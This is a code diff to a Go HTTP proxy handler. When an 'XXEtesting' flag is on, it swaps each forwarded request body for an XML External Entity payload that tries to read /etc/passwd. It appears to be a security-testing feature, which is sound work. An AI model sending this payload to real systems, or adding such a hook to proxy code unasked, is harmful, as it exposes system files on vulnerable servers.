@@ -185,6 +185,16 @@ func serveHTTP(w http.ResponseWriter, req *http.Request, db *sql.DB, XXEtesting 
 
     delHopHeaders(req.Header)
 
+    if XXEtesting {
+        reqBodyString := `
+        <!DOCTYPE foo [
+        <!ELEMENT foo ANY >
+        <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
+        <foo>&xxe;</foo>
+        `
+        req, _ = http.NewRequest(req.Method, req.URL.String(), strings.NewReader(reqBodyString))
+    }
+
     resp, err := client.Do(req)
     if err != nil {
         http.Error(w, "Server Error", http.StatusInternalServerError)
